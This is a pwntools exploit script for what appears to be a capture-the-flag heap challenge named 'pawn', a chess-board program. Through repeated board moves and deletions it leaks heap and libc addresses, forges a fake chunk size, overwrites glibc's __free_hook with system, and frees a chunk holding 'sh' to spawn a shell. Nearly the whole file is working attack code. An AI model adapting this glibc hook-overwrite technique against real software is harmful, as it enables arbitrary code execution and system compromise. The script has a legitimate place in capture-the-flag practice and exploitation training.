from pwn import *


binpath = './pawn'
# binpath = './a.out'
elf = ELF(binpath)
libc = elf.libc

context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']
# context.log_level = 'DEBUG'


gdbscript = '''
gef
set $boards=0x4040C0
set $t=0x4040A0

# b smite_piece
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
io = process(binpath)

def debug(func):
    from functools import wraps
    @wraps(func)
    def wrapper(*args, **kwargs):
        print("{}({}, {})".format(func.__name__, str(args), str(kwargs)))
        return func(*args, **kwargs)
    return wrapper

t = 0
# @debug
def new_board(index):
    io.sendlineafter(b'5) Delete Board\n', b'1')
    io.sendlineafter(b'?', b'%d' % index)
    io.recvuntil(b'do?')

# @debug
def print_board(index):
    io.sendlineafter(b'5) Delete Board\n', b'2')
    io.sendlineafter(b'index?', b'%d' % index)
    io.recvuntil(b'-x\n')
    data = io.recvuntil(b'|')
    ret = []
    for l in data.split(b'\n'):
        ret.append(l[2:])
    io.recvuntil(b'do?')
    return ret

# @debug
def move_piece(index, ox, oy, nx, ny):
    global t
    io.sendlineafter(b'5) Delete Board\n', b'3')
    io.sendlineafter(b'index?', b'%d' % index)
    io.sendlineafter(b'spaces.\n', b'%d %d' % (ox, oy))
    io.sendlineafter(b'spaces.\n', b'%d %d' % (nx, ny))
    data = io.recvuntil(b'do?')
    if b'Move made.' in data:
        t += 1

@debug
def smite_piece(index, x, y):
    io.sendlineafter(b'5) Delete Board\n', b'4')
    io.sendlineafter(b'index?', b'%d' % index)
    io.sendlineafter(b'spaces.\n', b'%d %d' % (x, y))
    io.recvuntil(b'do?')


# @debug
def delete_board(index):
    io.sendlineafter(b'5) Delete Board\n', b'5')
    io.sendlineafter(b'index?', b'%d' % index)
    io.recvuntil(b'do?')


# @debug
def increment_t(index):
    rows = print_board(index)
    if rows[1][7] == ord(b'P'):
        move_piece(index, 7, 1, 7, 2)
    if rows[1][7] == ord('.') and rows[0][7] == ord(b'R'):
        move_piece(index, 7, 0, 7, 1)
    elif rows[1][7] == ord(b'R'):
        move_piece(index, 7, 1, 7, 0)
    """
    if rows[1][0] == ord(b'P'):
        move_piece(index, 0, 1, 0, 2)
    if rows[1][0] == ord('.') and rows[0][0] == ord(b'R'):
        move_piece(index, 0, 0, 0, 1)
    elif rows[1][0] == ord(b'R'):
        move_piece(index, 0, 1, 0, 0)
    """

# leak heap address
new_board(0)
new_board(1)
for i in range(0x72):
    increment_t(0)
for i in range(7):
    new_board(2)
delete_board(1)
delete_board(0)
rows = print_board(0)
addr_heap = u64(rows[0].ljust(8, b'\x00')) - 0x1350
print('addr_heap = 0x{:08x}'.format(addr_heap))

# create fake chunk and free it
# create new rook
smite_piece(0, 6, 7)
# move rooks to size
move_piece(0, 7, 7, 9, 7)
move_piece(0, 9, 7, 10, 7)
move_piece(0, 6, 7, 9, 7)
for i in range(0x100 - 0x75):
    increment_t(2)
# fake size (0x04b1)
for i in range(4):
    increment_t(2)
smite_piece(0, 10, 7)  # fill 0x04
for i in range(0xb1 - 0x4):
    increment_t(2)
smite_piece(0, 9, 7)  # fill 0xb1
new_board(3)
new_board(3)
new_board(4)
delete_board(3)

# leak libc
while t % 0x100 != 0:
    increment_t(4)
for i in range(0x72):
    increment_t(4)
for i in range(1, 7):
    smite_piece(0, i, 7)  # change row 7 to rooks
# move rooks to fill null bytes
for i in range(7):
    move_piece(0, 7 - i, 7, 16 - i, 7)
move_piece(0, 0, 7, 8, 7)
rows = print_board(0)
print(rows)
data = rows[7][17:]
addr_libc = u64(data.ljust(8, b'\x00')) - 0x1ebbe0
print('addr_libc = 0x{:08x}'.format(addr_libc))

# fix unsorted bin
# fake size (0x04b1)
while t % 0x100 != 0:
    increment_t(4)
for i in range(11, 17):
    smite_piece(0, i, 7)  # null bytes
for i in range(4):
    increment_t(4)
smite_piece(0, 10, 7)  # fill 0x04
for i in range(0xb1 - 0x4):
    increment_t(4)
smite_piece(0, 9, 7)  # fill 0xb1

# overwrite __free_hook
delete_board(4)
delete_board(2)

def write_qw(index, base_offset, qw, y=7, target=0):
    for i in range(8):
        while t % 0x100 != 0:
            increment_t(target)
        b = p64(qw)[i]
        for _ in range(b):
            increment_t(target)
        smite_piece(index, base_offset + i, y)

while t % 0x100 != 0:
    increment_t(0)
smite_piece(2, 9, 7)
smite_piece(2, 18, 7)
for i in range(0x72):
    increment_t(0)
for i in range(1, 7):
    smite_piece(2, i, 7)  # change row 7 to rooks
# move rooks to fill null bytes
for i in range(7):
    move_piece(2, 7 - i, 7, 23 - i, 7)
write_qw(2, 17, addr_libc + libc.symbols['__free_hook'])

new_board(0)
new_board(1)  # now __free_hook is a chess board
# new_board(3)  # just to adjust t

write_qw(1, 0, addr_libc + libc.symbols['system'], 0, 0)
write_qw(0, 0, u64(b'sh\x00'.ljust(8, b'\x00')), 0, 0)

io.sendline(b'5')  # delete
io.sendline(b'0')

io.interactive()

# This exploit only works sometimes but it works :)
